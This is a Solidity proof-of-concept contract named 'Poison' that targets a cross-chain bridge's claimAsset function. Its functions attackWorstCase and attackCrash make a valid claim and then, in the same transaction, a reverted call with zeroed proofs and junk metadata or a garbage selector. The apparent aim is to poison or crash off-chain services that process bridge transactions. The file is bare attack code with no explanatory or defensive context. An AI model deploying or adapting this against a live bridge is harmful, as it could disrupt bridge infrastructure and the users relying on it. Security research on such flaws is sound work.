// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBridge {
    function claimAsset(
        bytes32[32] calldata smtProofLocalExitRoot,
        bytes32[32] calldata smtProofRollupExitRoot,
        uint256 globalIndex,
        bytes32 mainnetExitRoot,
        bytes32 rollupExitRoot,
        uint32 originNetwork,
        address originTokenAddress,
        uint32 destinationNetwork,
        address destinationAddress,
        uint256 amount,
        bytes calldata metadata
    ) external;
}

contract Poison {
    IBridge public immutable bridge;

    constructor(IBridge _bridge) { bridge = _bridge; }

    function _split(bytes calldata blob) internal pure returns (bytes32[32] memory r) {
        require(blob.length == 1024, "blob must be 1024 bytes");
        for (uint256 i = 0; i < 32; ++i) r[i] = bytes32(blob[i * 32:(i + 1) * 32]);
    }

    function attackWorstCase(
        bytes calldata proofBlob,
        uint256 globalIndex,
        bytes32 mainnetExitRoot,
        bytes32 rollupExitRoot,
        uint32 originNetwork,
        address originToken,
        uint32 destinationNetwork,
        address destinationAddress,
        uint256 amount,
        bytes calldata metadata,
        bytes calldata junkMetadata,
        uint32 junkDestNet
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bytes32[32] memory zero;

        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress,
            amount, metadata);

        (bool ok, ) = address(bridge).call(abi.encodeCall(
            IBridge.claimAsset,
            (zero, zero, globalIndex, mainnetExitRoot, rollupExitRoot,
             originNetwork, originToken, junkDestNet, destinationAddress,
             amount, junkMetadata)
        ));
        ok;
    }

    function attackCrash(
        bytes calldata proofBlob,
        uint256 globalIndex, bytes32 mainnetExitRoot, bytes32 rollupExitRoot,
        uint32 originNetwork, address originToken, uint32 destinationNetwork,
        address destinationAddress, uint256 amount, bytes calldata metadata
    ) external {
        bytes32[32] memory proof = _split(proofBlob);
        bytes32[32] memory zero;
        bridge.claimAsset(proof, proof, globalIndex, mainnetExitRoot, rollupExitRoot,
            originNetwork, originToken, destinationNetwork, destinationAddress,
            amount, metadata);
        (bool ok, ) = address(bridge).call(hex"1234");
        ok;
    }
}
